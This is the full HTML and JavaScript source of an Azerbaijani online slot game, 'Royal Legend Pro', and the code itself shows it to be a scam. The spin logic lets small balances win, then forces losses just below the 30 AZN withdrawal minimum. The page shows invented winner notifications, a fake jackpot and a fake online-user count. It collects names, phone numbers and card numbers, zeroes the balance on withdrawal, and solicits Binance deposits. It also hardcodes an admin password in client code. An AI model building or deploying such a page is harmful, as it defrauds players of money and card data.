<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Royal Legend Pro - Final Edition</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #0b1118; color: #fff; font-family: sans-serif; overflow: hidden; height: 100vh; position: relative; }
        .neon-text { text-shadow: 0 0 10px #00d2ff, 0 0 20px #9d50bb; }
        .glass { background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; }
        
        /* Arxa fonda Manat Yağışı */
        .m-rain { position: fixed; top: -50px; color: #2ecc71; font-weight: bold; font-size: 22px; z-index: -1; animation: fall linear infinite; opacity: 0.6; }
        @keyframes fall { to { transform: translateY(110vh) rotate(360deg); } }

        /* Realist Slot Animasiyası */
        .slot-box { height: 90px; overflow: hidden; background: #000; border: 2px solid #9d50bb; border-radius: 12px; position: relative; }
        .reel { position: absolute; width: 100%; top: 0; transition: top 2.8s cubic-bezier(0.45, 0.05, 0.55, 0.95); display: flex; flex-direction: column; align-items: center; }
        .symbol { height: 90px; display: flex; align-items: center; justify-content: center; font-size: 2.3rem; }

        /* Bildirişlər */
        #notif-area { position: fixed; left: 10px; bottom: 130px; z-index: 100; pointer-events: none; }
        .toast { background: rgba(0,0,0,0.85); color: #f1c40f; padding: 10px 18px; border-radius: 25px; margin-top: 8px; font-size: 12px; border-left: 4px solid #f1c40f; animation: slide 0.5s ease-out; }
        @keyframes slide { from { transform: translateX(-120%); } to { transform: translateX(0); } }

        /* Qızıl Yağışı Animasiyası */
        .coin { position: fixed; bottom: -50px; font-size: 30px; z-index: 200; animation: erupt 2.5s ease-out forwards; }
        @keyframes erupt { to { transform: translateY(-110vh) translateX(var(--x)); opacity: 0; } }
    </style>
</head>
<body>

    <div id="auth-modal" class="fixed inset-0 bg-black z-[500] flex items-center justify-center p-6">
        <div class="glass p-8 w-full max-w-sm text-center">
            <h2 class="text-3xl font-bold mb-6 neon-text italic">XOŞ GƏLDİNİZ!</h2>
            <input type="text" id="user_name" placeholder="Adınız" class="w-full p-4 mb-4 bg-gray-900 border border-purple-500 rounded-xl outline-none">
            <input type="tel" id="user_phone" placeholder="Nömrəniz" class="w-full p-4 mb-6 bg-gray-900 border border-purple-500 rounded-xl outline-none">
            <button onclick="handleAuth()" class="w-full bg-blue-600 p-4 rounded-xl font-bold text-xl active:scale-95 transition">OYUNA GİR</button>
        </div>
    </div>

    <div class="p-4 flex justify-between items-start relative z-50">
        <div>
            <h1 class="text-xl font-bold neon-text">ROYAL LEGEND PRO</h1>
            <p class="text-[11px] text-green-400 font-medium">🟢 Onlayn: <span id="on-count">4839</span></p>
        </div>
        <div class="text-right">
            <p class="text-yellow-500 font-black text-[10px] uppercase tracking-tighter">Jackpot</p>
            <p id="jk-val" class="text-2xl font-bold text-white italic">50000.00 AZN</p>
            <span onclick="openAdmin()" class="cursor-pointer text-2xl mt-1 block">🛑</span>
        </div>
    </div>

    <div class="container mx-auto px-4 mt-2 text-center">
        <div class="glass p-6 shadow-2xl relative">
            <p class="text-base mb-4 text-gray-300">Balansınız: <span id="balance-txt" class="text-green-400 font-bold text-2xl">0.00</span> AZN</p>
            
            <div class="grid grid-cols-4 gap-2 mb-6">
                <div class="slot-box"><div id="r1" class="reel"></div></div>
                <div class="slot-box"><div id="r2" class="reel"></div></div>
                <div class="slot-box"><div id="r3" class="reel"></div></div>
                <div class="slot-box"><div id="r4" class="reel"></div></div>
            </div>

            <input type="number" id="bet_input" value="1" class="w-full p-4 bg-gray-900 border-2 border-purple-600 rounded-2xl mb-4 text-center text-xl font-bold outline-none">
            <button id="spin-btn" onclick="startSpin()" class="w-full bg-gradient-to-r from-blue-600 to-purple-700 p-5 rounded-2xl font-black text-2xl shadow-lg active:scale-95 transition">FIRLAT! 🎰</button>
        </div>

        <div class="flex flex-col gap-2 mt-5">
            <button onclick="payoutRequest()" class="bg-red-600 py-3 rounded-xl font-bold uppercase text-sm">Pul Çıxar</button>
            <div class="flex gap-2">
                <button onclick="window.location.href='https://www.tiktok.com/@royal.legenda'" class="flex-1 border-2 border-white py-3 rounded-xl font-bold text-xs">TIKTOK DESTEK</button>
                <button onclick="copyBinance()" class="flex-1 bg-orange-500 py-3 rounded-xl font-bold text-black text-xs">BINANCE DEPOZIT</button>
            </div>
        </div>
    </div>

    <div id="notif-area"></div>

    <div id="admin-modal" class="fixed inset-0 bg-[#0b1118] z-[600] hidden p-6 overflow-y-auto">
        <div class="flex justify-between items-center mb-6 border-b border-gray-800 pb-3">
            <h2 class="text-2xl font-bold text-red-500 italic">ADMIN PANEL</h2>
            <button onclick="closeAdmin()" class="text-4xl">&times;</button>
        </div>
        <div id="admin-user-list" class="space-y-4"></div>
        <div class="mt-10 pt-5 border-t border-gray-800">
            <h3 class="text-yellow-500 font-bold mb-3">Çıxarış Tələbləri:</h3>
            <div id="admin-payouts" class="space-y-2 text-xs text-gray-400"></div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update, remove, get } from "https://www.gstatic.com/firebasejs/9.0.0/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBKGAVyVRnkTLgcv8c1D3G_HRwA8GwgcmQ",
            authDomain: "royal-legend-pro-574d5.firebaseapp.com",
            databaseURL: "https://royal-legend-pro-574d5-default-rtdb.firebaseio.com",
            projectId: "royal-legend-pro-574d5",
            storageBucket: "royal-legend-pro-574d5.firebasestorage.app",
            messagingSenderId: "696766803882",
            appId: "1:696766803882:web:859289afc952838c58c5d3"
        };

        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        const symbols = ['🍒', '🍋', '💎', '7', '💰', '🎰', '🔔', '🍇'];
        let currentUser = null;
        let isPlan2 = false;

        // Slotları hazırla
        document.querySelectorAll('.reel').forEach(r => {
            for(let i=0; i<50; i++) r.innerHTML += `<div class="symbol">${symbols[Math.floor(Math.random()*symbols.length)]}</div>`;
        });

        window.handleAuth = async () => {
            const name = document.getElementById('user_name').value;
            const phone = document.getElementById('user_phone').value;
            if(!name || !phone) return alert("Məlumatları daxil edin!");

            const userRef = ref(db, 'users/' + phone);
            const snapshot = await get(userRef);

            if(snapshot.exists()) {
                currentUser = snapshot.val();
            } else {
                currentUser = { name, phone, balance: 5.00, firstTime: true };
                await set(userRef, currentUser);
            }
            
            document.getElementById('auth-modal').style.display = 'none';
            syncUser();
            startEffects();
        };

        function syncUser() {
            onValue(ref(db, 'users/' + currentUser.phone), (snap) => {
                const data = snap.val();
                if(!data) return;
                // Plan 2 məntiqi: Əgər balans admin tərəfindən artırılıbsa (50+) aktivləşir
                if(data.balance > 50) isPlan2 = true;
                currentUser.balance = data.balance;
                document.getElementById('balance-txt').innerText = currentUser.balance.toFixed(2);
            });
        }

        window.startSpin = () => {
            let bet = parseFloat(document.getElementById('bet_input').value);
            if(bet < 1 || bet > currentUser.balance) return alert("Balans yetərsiz!");

            const btn = document.getElementById('spin-btn');
            btn.disabled = true;

            document.querySelectorAll('.reel').forEach((r, i) => {
                r.style.transition = 'none'; r.style.top = '0px';
                setTimeout(() => {
                    r.style.transition = `top ${2.5 + (i*0.3)}s cubic-bezier(0.45, 0.05, 0.55, 0.95)`;
                    r.style.top = '-4000px';
                }, 50);
            });

            setTimeout(() => {
                let win = 0;
                // Şirinləşdirmə alqoritmi
                if(!isPlan2 && currentUser.balance < 20) {
                    win = Math.random() < 0.7 ? bet * 1.5 : 0;
                } else if(isPlan2) {
                    // Plan 2: 29 AZN-ə qədər həvəsləndir, sonra 0-la
                    win = (currentUser.balance < 29) ? (Math.random() < 0.5 ? bet * 1.2 : 0) : 0;
                }

                currentUser.balance = (currentUser.balance - bet) + win;
                update(ref(db, 'users/' + currentUser.phone), { balance: currentUser.balance });
                if(win > 0) throwCoins();
                btn.disabled = false;
            }, 3500);
        };

        function startEffects() {
            // Canlı Jackpot
            let jk = 50000.00;
            setInterval(() => { jk += Math.random() * 0.05; document.getElementById('jk-val').innerText = jk.toFixed(2) + " AZN"; }, 1000);
            
            // Onlayn Sayğac
            let onl = 4839;
            setInterval(() => { onl += Math.floor(Math.random()*9)-4; document.getElementById('on-count').innerText = onl; }, 2500);

            // Manat Yağışı
            setInterval(() => {
                let m = document.createElement('div'); m.className = 'm-rain'; m.innerText = '₼';
                m.style.left = Math.random()*100 + 'vw'; m.style.animationDuration = (Math.random()*3+2)+'s';
                document.body.appendChild(m); setTimeout(() => m.remove(), 5000);
            }, 400);

            // Fake Win Bildirişləri
            const names = ["Eltun", "Elvin", "Samir", "Aysel", "Qonaq", "İstifadəçi 340"];
            setInterval(() => {
                let t = document.createElement('div'); t.className = 'toast';
                let n = names[Math.floor(Math.random()*names.length)];
                t.innerText = `${n} indicə ${Math.floor(Math.random()*150)+50} AZN uddu!`;
                document.getElementById('notif-area').appendChild(t); setTimeout(() => t.remove(), 6000);
            }, 10000);
        }

        function throwCoins() {
            for(let i=0; i<40; i++) {
                let c = document.createElement('div'); c.className = 'coin'; c.innerText = '💰';
                c.style.left = '50%'; c.style.setProperty('--x', (Math.random()*600 - 300) + 'px');
                document.body.appendChild(c); setTimeout(() => c.remove(), 2500);
            }
        }

        window.payoutRequest = () => {
            if(currentUser.balance < 30) return alert("Minimum çıxarış 30 AZN-dir!");
            const card = prompt("16 rəqəmli kart nömrənizi daxil edin:");
            if(card && card.length === 16) {
                const amt = currentUser.balance;
                set(ref(db, 'payouts/' + Date.now()), { name: currentUser.name, phone: currentUser.phone, card: card, amount: amt });
                update(ref(db, 'users/' + currentUser.phone), { balance: 0 });
                alert("Tələbiniz qəbul edildi. 24 saat ərzində yüklənəcək.");
            } else alert("Düzgün kart daxil edin!");
        };

        // --- ADMIN FUNKSİYALARI ---
        window.openAdmin = () => {
            if(prompt("Admin Parolu:") === "1907") {
                document.getElementById('admin-modal').style.display = 'block';
                loadAdminData();
            } else alert("Səhv parol!");
        };

        function loadAdminData() {
            onValue(ref(db, 'users'), (snap) => {
                let h = ''; const u = snap.val();
                for(let p in u) {
                    h += `<div class="p-4 glass flex justify-between items-center text-sm">
                        <div><b>${u[p].name}</b><br><small>${u[p].phone}</small><br><span class="text-green-400 font-bold">${u[p].balance.toFixed(2)} AZN</span></div>
                        <div class="flex gap-2">
                            <button onclick="editBal('${p}')" class="bg-blue-600 p-2 rounded">✏️ Edit</button>
                            <button onclick="deleteUser('${p}')" class="bg-red-600 p-2 rounded">🗑️ Sil</button>
                        </div>
                    </div>`;
                }
                document.getElementById('admin-user-list').innerHTML = h;
            });
            onValue(ref(db, 'payouts'), (snap) => {
                let h = ''; const p = snap.val();
                for(let id in p) { h += `<div class="p-2 bg-red-900/20 rounded border border-red-900">${p[id].name}: ${p[id].amount} AZN (Kart: ${p[id].card})</div>`; }
                document.getElementById('admin-payouts').innerHTML = h;
            });
        }

        window.editBal = (phone) => {
            const val = prompt("Yeni balans məbləğini yazın:");
            if(val !== null) update(ref(db, 'users/' + phone), { balance: parseFloat(val) });
        };

        window.deleteUser = (phone) => {
            if(confirm("Bu istifadəçini silmək istəyirsiz?")) remove(ref(db, 'users/' + phone));
        };

        window.closeAdmin = () => document.getElementById('admin-modal').style.display = 'none';
        window.copyBinance = () => { navigator.clipboard.writeText("TJQbpsPqD9up2iwHUCLZHDxs1g67uq3mrQ"); alert("Binance ID kopyalandı!"); };
    </script>
</body>
</html>
